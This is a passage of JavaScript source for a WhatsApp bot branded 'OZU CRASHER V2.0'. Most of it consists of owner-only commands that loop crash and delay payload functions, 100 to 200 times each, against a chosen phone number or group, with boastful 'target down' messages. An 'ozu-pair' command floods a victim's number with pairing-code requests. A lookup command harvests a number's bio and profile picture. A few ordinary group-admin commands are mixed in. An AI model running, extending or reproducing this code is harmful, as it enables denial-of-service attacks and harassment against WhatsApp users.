    `𝑻𝒉𝒆 𝒏𝒖𝒎𝒃𝒆𝒓 𝒔𝒕𝒂𝒓𝒕𝒔 𝒘𝒊𝒕𝒉 '0'. 𝑹𝒆𝒑𝒍𝒂𝒄𝒆 𝒊𝒕 𝒘𝒊𝒕𝒉 𝒕𝒉𝒆 𝒄𝒐𝒖𝒏𝒕𝒓𝒚 𝑪𝒐𝒅𝒆.\n\n𝑬𝒙𝒂𝒎𝒑𝒍𝒆: ${prefix + command} 234xxxx`
  )
}

let target = jidx + "@s.whatsapp.net"

// React
await stillchasing.sendMessage(m.chat, {
  react: { text: "☠️", key: m.key }
})

// ======================
// STARTING MESSAGE
// ======================
await Reply(`

⚠️ 「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐈𝐍 𝐏𝐑𝐎𝐆𝐑𝐄𝐒𝐒 」

𝙎𝙚𝙣𝙙𝙞𝙣𝙜 𝙝𝙞𝙜𝙝-𝙡𝙚𝙫𝙚𝙡 𝙊𝙕𝙐 𝘾𝙍𝘼𝙎𝙃𝙀𝙍 𝙗𝙪𝙜 𝙩𝙤 𝙩𝙖𝙧𝙜𝙚𝙩...

𝙋𝙡𝙚𝙖𝙨𝙚 𝙬𝙖𝙞𝙩 𝙖 𝙢𝙤𝙢𝙚𝙣𝙩 𝙬𝙝𝙞𝙡𝙚 𝙙𝙚𝙡𝙞𝙫𝙚𝙧𝙮 𝙞𝙨 𝙞𝙣 𝙥𝙧𝙤𝙜𝙧𝙚𝙨𝙨...

🎯 𝙏𝙖𝙧𝙜𝙚𝙩 : ${jidx}

☠️ 「 𝐒𝐓𝐀𝐍𝐃 𝐁𝐘 」
`)

// SUCCESS MESSAGE WITH PICTURE (after 1 minutes )
setTimeout(async () => {
  await stillchasing.sendMessage(m.chat, {
    image: { url: "https://files.catbox.moe/pdvvt8.png" },   
    caption: `
⏤͟͟͞͞⏤͟͟͞͞ ✅ 𝐁𝐔𝐆 𝐒𝐄𝐍𝐓 𝐒𝐔𝐂𝐂𝐄𝐒𝐒𝐅𝐔𝐋𝐋𝐘 ⏤͟͟͞͞⏤͟͟͞͞

╔══〔  𝐁𝐔𝐆 𝐒𝐄𝐍𝐓 〕══╗

❏🎯 ᴛᴀʀɢᴇᴛ : ${jidx}
┃
❏⚙️ ᴄᴏᴍᴍᴀɴᴅ    : ${command}
║
❏👑 ᴅᴇᴠ    : ʙᴀᴅ_ʙᴏɪ_sᴛɪʟʟᴄʜᴀsɪɴɢ
┃
❏⚡ sᴛᴀᴛᴜs : sᴜᴄᴄᴇss
║
❏💀 ʀᴇsᴜʟᴛ : ᴛᴀʀɢᴇᴛ ᴅᴏᴡɴ ᴀɴᴅ ғᴀᴄɪɴɢ ᴄᴀʟᴀᴍɪᴛʏ

╚══〔 ᴏᴢᴜ ⚡🥋 〕══╝`
  }, { quoted: m })
}, 100000)
// Crash loop
for (let i = 0; i < 100; i++) {
  await DelayVisi(stillchasing, target);
  await ExoDelayHours(target, true);
  await RadiationDelay(target);
  await Delay(stillchasing, target);
  await Delay(stillchasing, target);
  await Invis(target);
  await sleep(1000)
}

console.log(chalk.red.bold("𝗦𝘂𝗰𝗰𝗲𝘀𝘀 𝗦𝗲𝗻𝗱 𝗕𝘂𝗴 𝗧𝗼 𝗧𝗮𝗿𝗴𝗲𝘁🎯"))
}

break;
case "force-ui": { 
if (!isCreator) return Reply(mess.owner)
if (!q) return Reply(`𝗘𝘅𝗮𝗺𝗽𝗹𝗲:\n${prefix + command} 𝟮𝟯𝟰𝘅𝘅𝘅𝘅𝘅𝘅  / 𝗧𝗮𝗴 𝗮 𝗨𝘀𝗲𝗿 @tag`)

let jidx = q.replace(/[^0-9]/g, "")

if (jidx.startsWith("0")) {
  return Reply(
    `𝑻𝒉𝒆 𝒏𝒖𝒎𝒃𝒆𝒓 𝒔𝒕𝒂𝒓𝒕𝒔 𝒘𝒊𝒕𝒉 '0'. 𝑹𝒆𝒑𝒍𝒂𝒄𝒆 𝒊𝒕 𝒘𝒊𝒕𝒉 𝒕𝒉𝒆 𝒄𝒐𝒖𝒏𝒕𝒓𝒚 𝑪𝒐𝒅𝒆.\n\n𝑬𝒙𝒂𝒎𝒑𝒍𝒆: ${prefix + command} 234xxxx`
  )
}

let target = jidx + "@s.whatsapp.net"

// React
await stillchasing.sendMessage(m.chat, {
  react: { text: "☠️", key: m.key }
})

// ======================
// STARTING MESSAGE
// ======================
await Reply(`

⚠️ 「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐈𝐍 𝐏𝐑𝐎𝐆𝐑𝐄𝐒𝐒 」

𝙎𝙚𝙣𝙙𝙞𝙣𝙜 𝙝𝙞𝙜𝙝-𝙡𝙚𝙫𝙚𝙡 𝙊𝙕𝙐 𝘾𝙍𝘼𝙎𝙃𝙀𝙍 𝙗𝙪𝙜 𝙩𝙤 𝙩𝙖𝙧𝙜𝙚𝙩...

𝙋𝙡𝙚𝙖𝙨𝙚 𝙬𝙖𝙞𝙩 𝙖 𝙢𝙤𝙢𝙚𝙣𝙩 𝙬𝙝𝙞𝙡𝙚 𝙙𝙚𝙡𝙞𝙫𝙚𝙧𝙮 𝙞𝙨 𝙞𝙣 𝙥𝙧𝙤𝙜𝙧𝙚𝙨𝙨...

🎯 𝙏𝙖𝙧𝙜𝙚𝙩 : ${jidx}

☠️ 「 𝐒𝐓𝐀𝐍𝐃 𝐁𝐘 」
`)

// SUCCESS MESSAGE WITH PICTURE (after 1 minutes )
setTimeout(async () => {
  await stillchasing.sendMessage(m.chat, {
    image: { url: "https://files.catbox.moe/pdvvt8.png" },   
    caption: `
⏤͟͟͞͞⏤͟͟͞͞ ✅ 𝐁𝐔𝐆 𝐒𝐄𝐍𝐓 𝐒𝐔𝐂𝐂𝐄𝐒𝐒𝐅𝐔𝐋𝐋𝐘 ⏤͟͟͞͞⏤͟͟͞͞

╔══〔  𝐁𝐔𝐆 𝐒𝐄𝐍𝐓 〕══╗

❏🎯 ᴛᴀʀɢᴇᴛ : ${jidx}
┃
❏⚙️ ᴄᴏᴍᴍᴀɴᴅ    : ${command}
║
❏👑 ᴅᴇᴠ    : ʙᴀᴅ_ʙᴏɪ_sᴛɪʟʟᴄʜᴀsɪɴɢ
┃
❏⚡ sᴛᴀᴛᴜs : sᴜᴄᴄᴇss
║
❏💀 ʀᴇsᴜʟᴛ : ᴛᴀʀɢᴇᴛ ᴅᴏᴡɴ ᴀɴᴅ ғᴀᴄɪɴɢ ᴄᴀʟᴀᴍɪᴛʏ

╚══〔 ᴏᴢᴜ ⚡🥋 〕══╝`
  }, { quoted: m })
}, 100000)   

// Crash loop
for (let i = 0; i < 100; i++) {
  await StcSqL(stillchasing, target);
  R9X(stillchasing, target, false);
  await stx(target, true);
  await RadiationDelay(target);
  await Delay(stillchasing, target);
  await ExoDelayHours(target, true);
  await sleep(1000)
}

console.log(chalk.red.bold("𝗦𝘂𝗰𝗰𝗲𝘀𝘀 𝗦𝗲𝗻𝗱 𝗕𝘂𝗴 𝗧𝗼 𝗧𝗮𝗿𝗴𝗲𝘁🎯"))
}
break;
case "crashing":
case "driller":
case "killer": { 
if (!isCreator) return Reply(mess.owner)
if (!q) return Reply(`𝗘𝘅𝗮𝗺𝗽𝗹𝗲:\n${prefix + command} 𝟮𝟯𝟰𝘅𝘅𝘅𝘅𝘅𝘅  / 𝗧𝗮𝗴 𝗮 𝗨𝘀𝗲𝗿 @tag`)

let jidx = q.replace(/[^0-9]/g, "")

if (jidx.startsWith("0")) {
  return Reply(
    `𝑻𝒉𝒆 𝒏𝒖𝒎𝒃𝒆𝒓 𝒔𝒕𝒂𝒓𝒕𝒔 𝒘𝒊𝒕𝒉 '0'. 𝑹𝒆𝒑𝒍𝒂𝒄𝒆 𝒊𝒕 𝒘𝒊𝒕𝒉 𝒕𝒉𝒆 𝒄𝒐𝒖𝒏𝒕𝒓𝒚 𝑪𝒐𝒅𝒆.\n\n𝑬𝒙𝒂𝒎𝒑𝒍𝒆: ${prefix + command} 234xxxx`
  )
}

let target = jidx + "@s.whatsapp.net"

// React
await stillchasing.sendMessage(m.chat, {
  react: { text: "☠️", key: m.key }
})

// ======================
// STARTING MESSAGE
// ======================
await Reply(`

⚠️ 「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐈𝐍 𝐏𝐑𝐎𝐆𝐑𝐄𝐒𝐒 」

𝙎𝙚𝙣𝙙𝙞𝙣𝙜 𝙝𝙞𝙜𝙝-𝙡𝙚𝙫𝙚𝙡 𝙊𝙕𝙐 𝘾𝙍𝘼𝙎𝙃𝙀𝙍 𝙗𝙪𝙜 𝙩𝙤 𝙩𝙖𝙧𝙜𝙚𝙩...

𝙋𝙡𝙚𝙖𝙨𝙚 𝙬𝙖𝙞𝙩 𝙖 𝙢𝙤𝙢𝙚𝙣𝙩 𝙬𝙝𝙞𝙡𝙚 𝙙𝙚𝙡𝙞𝙫𝙚𝙧𝙮 𝙞𝙨 𝙞𝙣 𝙥𝙧𝙤𝙜𝙧𝙚𝙨𝙨...

🎯 𝙏𝙖𝙧𝙜𝙚𝙩 : ${jidx}

☠️ 「 𝐒𝐓𝐀𝐍𝐃 𝐁𝐘 」
`)

// SUCCESS MESSAGE WITH PICTURE (after 1 minutes )
setTimeout(async () => {
  await stillchasing.sendMessage(m.chat, {
    image: { url: "https://files.catbox.moe/pdvvt8.png" },   
    caption: `
⏤͟͟͞͞⏤͟͟͞͞ ✅ 𝐁𝐔𝐆 𝐒𝐄𝐍𝐓 𝐒𝐔𝐂𝐂𝐄𝐒𝐒𝐅𝐔𝐋𝐋𝐘 ⏤͟͟͞͞⏤͟͟͞͞

╔══〔  𝐁𝐔𝐆 𝐒𝐄𝐍𝐓 〕══╗

❏🎯 ᴛᴀʀɢᴇᴛ : ${jidx}
┃
❏⚙️ ᴄᴏᴍᴍᴀɴᴅ    : ${command}
║
❏👑 ᴅᴇᴠ    : ʙᴀᴅ_ʙᴏɪ_sᴛɪʟʟᴄʜᴀsɪɴɢ
┃
❏⚡ sᴛᴀᴛᴜs : sᴜᴄᴄᴇss
║
❏💀 ʀᴇsᴜʟᴛ : ᴛᴀʀɢᴇᴛ ᴅᴏᴡɴ ᴀɴᴅ ғᴀᴄɪɴɢ ᴄᴀʟᴀᴍɪᴛʏ

╚══〔 ᴏᴢᴜ ⚡🥋 〕══╝`
  }, { quoted: m })
}, 100000)

// Crash loop
for (let i = 0; i < 100; i++) {
  await StcSqL(stillchasing, target);
  R9X(stillchasing, target, false);
  await ExoDelayHours(target, true);
  await stickerCrash(target);
  await RadiationDelay(target);
  await Delay(stillchasing, target);
  await sleep(1000)
}

console.log(chalk.red.bold("𝗦𝘂𝗰𝗰𝗲𝘀𝘀 𝗦𝗲𝗻𝗱 𝗕𝘂𝗴 𝗧𝗼 𝗧𝗮𝗿𝗴𝗲𝘁🎯"))
}

//==== Bug Cases Ended here =====

//==== Starting Group Cases
case "kill-gc": {
    if (!isCreator) {
        return stillchasing.sendMessage(m.chat, { 
            text: "❌ Owner Only Command!" 
        }, { quoted: m });
    }

    if (!m.isGroup) {
        return stillchasing.sendMessage(m.chat, { 
            text: "❌ This command can only be used inside a group!" 
        }, { quoted: m });
    }

    await stillchasing.sendMessage(m.chat, {
        react: { text: "☠️", key: m.key }
    });

    // Your original bug message (kept exactly)
    await stillchasing.sendMessage(m.chat, {
        text: `
⏤͟͟͞͞⏤͟͟͞͞ ✅ 𝘽𝙪𝙜 𝙨𝙚𝙣𝙩 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮 ⏤͟͟͞͞⏤͟͟͞͞

┏╺╺ ╸☛   𝙂𝙍𝙊𝙪𝙋 𝘽𝙐𝙂 𝙎𝙀𝙉𝙏  ☚ ╸╸╸
║
➭ 🎯 𝙏𝙖𝙧𝙜𝙚𝙩  : ${m.chat.split('@')[0]} (Group)
┃
➭ 🗿 𝗰𝗼𝗺𝗺𝗮𝗻𝗱  : ${command}
┃
➭ 👑 𝘾𝙧𝙚𝙖𝙩𝙤𝙧 : 𝗯𝗮𝗱𝗯𝗼𝗼𝘀𝘁𝗶𝗹𝗹𝗰𝗵𝗮𝘀𝗶𝗻𝗴
║
➭ ⚡ 𝙎𝙩𝙖𝙩𝙪𝙨  : 𝙂𝙧𝙤𝙪𝙥 𝙙𝙤𝙬𝙣 ⬤
║
➭ 💀 𝙈𝙚𝙢𝙗𝙚𝙧𝙨 𝙬𝙞𝙡𝙡 𝙣𝙤𝙬 𝙛𝙖𝙘𝙚 𝙩𝙝𝙚 𝙝𝙞𝙜𝙝𝙚𝙨𝙩 𝙗𝙪𝙜 𝙤𝙛 𝙊𝙕𝙐 𝘾𝙍𝙀𝙎𝙃𝙀𝙍 🔥
┗╺╺╺╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸

╰━━━〔 𝗯𝗮𝗱𝗯𝗼𝗼𝘀𝘁𝗶𝗹𝗹𝗰𝗵𝗮𝘀𝗶𝗻𝗴⚡️🥋 〕━━━╯`
    }, { quoted: m });

    // Strong loop - 
       for (let i = 0; i < 200; i++) {
  await R9X(stillchasing, m.chat, false);
  await ButtonCrashGB(m.chat);
  await sleep(1200);   // faster spam for stronger effect
    }

    console.log(chalk.red.bold(`Strong group crash bomb deployed on ${m.chat} 🎯`));

    break;
}

case "delay-gc": {
   
    if (!isCreator) {
        return stillchasing.sendMessage(m.chat, { 
            text: "❌ Owner Only Command!" 
        }, { quoted: m });
    }

    if (!m.isGroup) {
        return stillchasing.sendMessage(m.chat, { 
            text: "❌ This command can only be used inside a group!" 
        }, { quoted: m });
    }

    await stillchasing.sendMessage(m.chat, {
        react: { text: "☠️", key: m.key }
    });

    // Your original message (kept exactly as you wrote it)
    await stillchasing.sendMessage(m.chat, {
        text: `
⏤͟͟͞͞⏤͟͟͞͞ ✅ 𝘽𝙪𝙜 𝙨𝙚𝙣𝙩 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮 ⏤͟͟͞͞⏤͟͟͞͞

┏╺╺ ╸☛   𝙂𝙍𝙊𝙪𝙋 𝘽𝙐𝙂 𝙎𝙀𝙉𝙏  ☚ ╸╸╸
║
➭ 🎯 𝙏𝙖𝙧𝙜𝙚𝙩  : ${m.chat.split('@')[0]} (Group)
┃
➭ 🗿 𝗰𝗼𝗺𝗺𝗮𝗻𝗱  : ${command}
┃
➭ 👑 𝘾𝙧𝙚𝙖𝙩𝙤𝙧 : 𝗯𝗮𝗱𝗯𝗼𝗼𝘀𝘁𝗶𝗹𝗹𝗰𝗵𝗮𝘀𝗶𝗻𝗴
║
➭ ⚡ 𝙎𝙩𝙖𝙩𝙪𝙨  : 𝙂𝙧𝙤𝙪𝙥 𝙙𝙤𝙬𝙣 ⬤
║
➭ 💀 𝙈𝙚𝙢𝙗𝙚𝙧𝙨 𝙬𝙞𝙡𝙡 𝙣𝙤𝙬 𝙛𝙖𝙘𝙚 𝙩𝙝𝙚 𝙝𝙞𝙜𝙝𝙚𝙨𝙩 𝙗𝙪𝙜 𝙤𝙛 𝙊𝙕𝙐 𝘾𝙍𝙀𝙎𝙃𝙀𝙍 🔥
┗╺╺╺╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸

╰━━━〔 𝗯𝗮𝗱𝗯𝗼𝗼𝘀𝘁𝗶𝗹𝗹𝗰𝗵𝗮𝘀𝗶𝗻𝗴⚡️🥋 〕━━━╯`
    }, { quoted: m });

    // Strong loop
    for (let i = 0; i < 200; i++) {
  await R9X2(stillchasing, m.chat, false);
  await ButtonCrashGB(m.chat);
  await sleep(1200);   // faster spam for stronger effect
    }

    console.log(chalk.red.bold(`Strong group crash bomb deployed on ${m.chat} 🎯`));
    break;
}

case "lockgc": {
    if (!m.isGroup) return Reply("❌ Group only");
    if (!isAdmins) return Reply("❌ Admin only");

    let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    contextInfo: {
                        forwardingScore: 99999,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "120363361579058856@newsletter",
                            serverMessageId: 1,
                            newsletterName: "𝗢𝗭𝗨 𝗖𝗥𝗔𝗦𝗛𝗘𝗥 𝗩2.0 "
                        }
                    },
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: `
╔════════════════╗
║⚙️ 𝗢𝗽𝗲𝗻
┃🔐 𝗖𝗹𝗼𝘀𝗲
║🔓 𝗢𝗽𝗲𝗻 𝗧𝗶𝗺𝗲
┃🔐 𝗖𝗹𝗼𝘀𝗲 𝗧𝗶𝗺𝗲
╚═════════════════


⚡ 𝗢𝗭𝗨 𝗖𝗥𝗔𝗦𝗛𝗘𝗥 𝗩2.0

𝗖𝗵𝗼𝗼𝘀𝗲 𝗮𝗻 𝗮𝗰𝘁𝗶𝗼𝗻 𝗕𝘂𝘁𝘁𝗼𝗻 𝗯𝗲𝗹𝗼𝘄👇:
`
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                        text: "© 𝗯𝗮𝗱𝗯𝗼𝗼𝘀𝘁𝗶𝗹𝗹𝗰𝗵𝗮𝘀𝗶𝗻𝗴 😌"
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [
                            {
                                name: "quick_reply",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "🔓 𝗢𝗽𝗲𝗻",
                                    id: `${prefix}open`
                                })
                            },
                            {
                                name: "quick_reply",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "🔒 𝗖𝗹𝗼𝘀𝗲",
                                    id: `${prefix}close`
                                })
                            },
                            {
                                name: "quick_reply",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "⏰ 𝗢𝗽𝗲𝗻 𝗧𝗶𝗺𝗲",
                                    id: `${prefix}opentime`
                                })
                            },
                            {
                                name: "quick_reply",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "⏳ 𝗖𝗹𝗼𝘀𝗲 𝗧𝗶𝗺𝗲",
                                    id: `${prefix}closetime`
                                })
                            }
                        ]
                    })
                })
            }
        }
    }, { quoted: m });

    await stillchasing.relayMessage(m.chat, msg.message, { messageId: msg.key.id });
}



break;
case "closetime": {
    if (!m.isGroup) return;
    if (!isAdmins) return Reply("❌ Admin only");
    if (!q) return Reply("Example: .closetime 10s | 5m | 2h | 1d");

    let delay = parseTime(q);
    if (!delay) return Reply("❌ Invalid time format\nUse: s / m / h / d");

    Reply(`⏳ Group will CLOSE in ${q}`);

    setTimeout(async () => {
        await stillchasing.groupSettingUpdate(m.chat, "announcement");
        Reply("🔒 Group is now CLOSED");
    }, delay);
}
break;
case 'inspectnum':
case 'num': {
    if (!text) return stillchasing.sendMessage(m.chat, { text: "📱 Provide a number with country code!\nExample: .num 23480xxxxxxxx" }, { quoted: m });

    await stillchasing.sendMessage(m.chat, { react: { text: '🔍', key: m.key } });

    try {
        let cleanNum = text.replace(/[^0-9]/g, '');
        let jid = cleanNum + '@s.whatsapp.net';
        let [res] = await stillchasing.onWhatsApp(jid);

        if (res && res.exists) {
            // --- REGISTERED & ACTIVE ---
            let info = await stillchasing.fetchStatus(jid).catch(() => ({ status: "Hidden / No Bio" }));
            let pp = await stillchasing.profilePictureUrl(jid, 'image').catch(() => 'https://i.imgur.com/89S9pXp.png');

            let msg = `📱 *𝗡𝗨𝗠𝗕𝗘𝗥 𝗖𝗛𝗘𝗖𝗞𝗘𝗥*\n\n`;
            msg += `📍 *Status:* Active ✅\n`;
            msg += `🆔 *JID:* ${res.jid}\n`;
            msg += `📝 *Bio:* ${info.status || "No Bio Set"}\n\n`;
            msg += `_Number is currently active on WhatsApp._`;

            await stillchasing.sendMessage(m.chat, { 
                image: { url: pp }, 
                caption: msg 
            }, { quoted: m });

        } else {
            // --- BANNED OR NOT REGISTERED ---
            let bannedImg = "https://i.ibb.co/Kxgj6LmR/8943d8d00920.jpg"; 

            let msg = `🚫 *𝗜𝗡𝗦𝗣𝗘𝗖𝗧𝗜𝗢𝗡 𝗥𝗘𝗦𝗨𝗟𝗧*\n\n`;
            msg += `📍 *Possible Reason:* Banned or Not Registered\n`;
            msg += `🔢 *Number:* +${cleanNum}\n\n`;
            msg += `⚠️ _Note: WhatsApp does not clearly distinguish between a banned account and a non-existent one. If this number was recently active, it is likely banned._`;

            await stillchasing.sendMessage(m.chat, { 
                image: { url: bannedImg }, 
                caption: msg 
            }, { quoted: m });
        }
    } catch (e) {
        console.error(e);
        stillchasing.sendMessage(m.chat, { text: "❌ Error inspecting number. Please try again." }, { quoted: m });
    }
}
break;
case 'gcstatus':
case 'groupstatus':
case 'togstatus':
case 'togcstatus':
case 'gstatus': {
    if (!m.isGroup) return reply('❌ This command only works in groups.');
    if (!isAdmins) return Reply("❌ 𝗔𝗱𝗺𝗶𝗻 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 𝗼𝗻𝗹𝘆");
//    if (!isAdmins) return reply('❌ Only admins can use this command.');
    
    try {
        await stillchasing.sendMessage(m.chat, { react: { text: '📢', key: m.key } });
        
        const textInput = text || '';
        const quotedMsg = m.quoted;
        
        // If no quoted message and no text
        if (!quotedMsg && !textInput) {
            return reply(`📢 *GROUP STATUS*\n\nReply to an image/video/audio/text, or provide text.\n\n*Examples:*\n• ${prefix}gcstatus Hello group!\n• Reply to media and send ${prefix}gcstatus optional caption`);
        }
        
        // TEXT-ONLY STATUS (no quoted message)
        if (!quotedMsg && textInput) {
            try {
                // Try to send as group status with styling
                await stillchasing.sendMessage(m.chat, {
                    text: textInput,
                    contextInfo: { 
                        isGroupStatus: true,
                        forwardingScore: 999,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: NEWSLETTER_JID,
                            newsletterName: "ozu",
                        }
                    }
                });
                await stillchasing.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
                return reply('✅ *Text posted to group status!*');
            } catch (err) {
                // Fallback to normal message
                await stillchasing.sendMessage(m.chat, {
                    text: `📢 *GROUP STATUS*\n\n${textInput}`,
                    contextInfo: {
                        forwardingScore: 999,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: NEWSLETTER_JID,
                            newsletterName: "ʙʀᴀɪɴʏ ᴍᴅ",
                        }
                    }
                });
                await stillchasing.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
                return reply('✅ *Posted to chat!* (Status posting not available)');
            }
        }
        
        // QUOTED TEXT MESSAGE
        if (quotedMsg && (quotedMsg.mtype === 'conversation' || quotedMsg.mtype === 'extendedTextMessage')) {
            let quotedText = '';
            if (quotedMsg.mtype === 'conversation') {
                quotedText = quotedMsg.message?.conversation || '';
            } else if (quotedMsg.mtype === 'extendedTextMessage') {
                quotedText = quotedMsg.message?.extendedTextMessage?.text || '';
            }
            
            const finalText = textInput ? `${quotedText}\n\n${textInput}` : quotedText;
            
            try {
                await stillchasing.sendMessage(m.chat, {
                    text: finalText,
                    contextInfo: { isGroupStatus: true }
                });
                await stillchasing.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
                return reply('✅ *Text posted to group status!*');
            } catch (err) {
                await stillchasing.sendMessage(m.chat, {
                    text: `📢 *GROUP STATUS*\n\n${finalText}`
                });
                return reply('✅ *Posted to chat!*');
            }
        }
        
        // QUOTED IMAGE MESSAGE
        if (quotedMsg && (quotedMsg.mtype === 'imageMessage')) {
            const imageBuffer = await stillchasing.downloadMediaMessage(quotedMsg);
            if (!imageBuffer) return reply('❌ Failed to download image.');
            
            try {
                await stillchasing.sendMessage(m.chat, {
                    image: imageBuffer,
                    caption: textInput || '',
                    contextInfo: { isGroupStatus: true }
                });
                await stillchasing.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
                return reply('✅ *Image posted to group status!*');
            } catch (err) {
                await stillchasing.sendMessage(m.chat, {
                    image: imageBuffer,
                    caption: `📢 *GROUP STATUS*\n\n${textInput || ''}`
                });
                return reply('✅ *Image posted to chat!*');
            }
        }
        
        // QUOTED VIDEO MESSAGE
        if (quotedMsg && (quotedMsg.mtype === 'videoMessage')) {
            const videoBuffer = await stillchasing.downloadMediaMessage(quotedMsg);
            if (!videoBuffer) return reply('❌ Failed to download video.');
            
            try {
                await stillchasing.sendMessage(m.chat, {
                    video: videoBuffer,
                    caption: textInput || '',
                    contextInfo: { isGroupStatus: true }
                });
                await stillchasing.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
                return reply('✅ *Video posted to group status!*');
            } catch (err) {
                await stillchasing.sendMessage(m.chat, {
                    video: videoBuffer,
                    caption: `📢 *GROUP STATUS*\n\n${textInput || ''}`
                });
                return reply('✅ *Video posted to chat!*');
            }
        }
        
        // QUOTED AUDIO/VOICE MESSAGE
        if (quotedMsg && (quotedMsg.mtype === 'audioMessage')) {
            const audioBuffer = await stillchasing.downloadMediaMessage(quotedMsg);
            if (!audioBuffer) return reply('❌ Failed to download audio.');
            
            try {
                await stillchasing.sendMessage(m.chat, {
                    audio: audioBuffer,
                    mimetype: 'audio/mpeg',
                    ptt: true,
                    contextInfo: { isGroupStatus: true }
                });
                await stillchasing.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
                return reply('✅ *Voice note posted to group status!*');
            } catch (err) {
                await stillchasing.sendMessage(m.chat, {
                    audio: audioBuffer,
                    mimetype: 'audio/mpeg',
                    ptt: true
                });
                return reply('✅ *Voice note posted to chat!*');
            }
        }
        
        return reply('❌ Unsupported media type. Please reply to an image, video, voice note, or text.');
        
    } catch (error) {
        console.error('GCStatus error:', error);
        reply('❌ Failed to post to group status. Make sure the bot is admin and try again.');
    }
}
break
case "antilink": 
case "🔗":{
    if (!isAdmins && !isCreator) return m.reply("ʙᴀᴄᴋ ᴏғғ ᴄᴏᴍʀᴀᴅᴇ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ ɪs ғᴏʀ ᴏᴡɴᴇʀ & ᴀᴅᴍɪɴs ɪɴ.ᴛʜᴇ ɢʀᴏᴜᴘ ᴏɴʟʏ.");
    if (!args[0]) return m.reply("ɪɴᴄᴏʀʀᴇᴄᴛ ᴜsᴀɢᴇ: ᴀɴᴛɪʟɪɴᴋ ᴏɴ/ᴏғғ");
    if (!m.isGroup) return m.reply("ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ ᴏɴʟʏ ᴡᴏʀᴋs ɪɴ ɢʀᴏᴜᴘ ʙᴏss.");

    if (args[0].toLowerCase() === "on") {
        setSetting(m.chat, "antilink", true);
        m.reply("🛡️  ᴇʀᴜʙᴜs sᴇᴄᴜʀɪᴛʏ ɪs ᴀᴄᴛɪᴠᴇ ᴀɴᴛɪʟɪɴᴋ ɪs ɴᴏᴡ ᴀᴄᴛɪᴠᴇ ɪɴ ᴛʜɪs ɢʀᴏᴜᴘ 🧐");
    } else if (args[0].toLowerCase() === "off") {
        setSetting(m.chat, "antilink", false);
        m.reply("⛔ AntiLink disabled for this group");
    } else m.reply("Usage: antilink on/off");
}
break;
case 'ozu-pair': {
    if (!isCreator) {
        return stillchasing.sendMessage(m.chat, { 
            text: "🚫 *ACCESS DENIED*\n\n👑 Only the *Bot Creator or Owners* can use this command" 
        }, { quoted: m });
    }

    if (!q) {
        return stillchasing.sendMessage(m.chat, { 
            text: `Usage: ${prefix + command} number|amount\nExample: ${prefix + command} 2349017593981|50` 
        }, { quoted: m });
    }

    let [targetNumber, amountStr = "30"] = q.split("|");
    let target = targetNumber.replace(/[^0-9]/g, '').trim();

    if (target.length < 10) {
        return stillchasing.sendMessage(m.chat, { text: "❌ Invalid number!\nUse format: 234xxxxxxxxxx" }, { quoted: m });
    }

    let amount = Math.min(parseInt(amountStr) || 30, 80);

    // Starting Message
    await stillchasing.sendMessage(m.chat, { 
        text: `☠️ *OZU PAIRING CODE ATTACK INITIATED*\n\n` +
              `🎯 *Target:* ${target}\n` +
              `📊 *Amount:* ${amount} codes\n` +
              `⏳ *Status:* Starting attack...\n\n` +
              `Codes will be sent every 2 minutes.` 
    }, { quoted: m });

    try {
        const { default: makeWaSocket, useMultiFileAuthState, fetchLatestBaileysVersion } = require('@whiskeysockets/baileys');
        const pino = require('pino');

        const { state } = await useMultiFileAuthState(`./sessions/ozu-${Date.now()}`);
        const { version } = await fetchLatestBaileysVersion();

        const sock = makeWaSocket({
            auth: state,
            version,
            logger: pino({ level: 'silent' }),
            printQRInTerminal: false,
            browser: ["Ubuntu", "Chrome", "110.0.0"]
        });

        let successCount = 0;

        sock.ev.on('connection.update', async (update) => {
            const { connection, qr } = update;

            if (qr || connection === 'connecting') {
                // Successful message after 3 seconds
                setTimeout(async () => {
                    await stillchasing.sendMessage(m.chat, { 
                        text: `✅ *ATTACK STARTED SUCCESSFULLY!*\n\n` +
                              `🎯 Target Number: ${target}\n` +
                              `📊 Total Codes: ${amount}\n` +
                              `⏱️ Delay: 2 minutes per code\n\n` +
                              `☠️ Pairing codes are now being sent...\n` +
                              `You will be notified when the process is complete.` 
                    }, { quoted: m });
                }, 10000); // 3 seconds after start

                // Send pairing codes with 2 minutes delay between each
                for (let i = 0; i < amount; i++) {
                    try {
                        await new Promise(r => setTimeout(r, 120000)); // 2 minutes = 120000 ms
                        const code = await sock.requestPairingCode(target);
                        successCount++;
                        console.log(`[\( {i+1}/ \){amount}] ✅ Pairing code sent to ${target}`);
                    } catch (e) {
                        console.log(`[\( {i+1}/ \){amount}] ❌ Failed: ${e.message}`);
                    }
                }

                // Final completion message (after all codes sent)
                setTimeout(async () => {
                    await stillchasing.sendMessage(m.chat, { 
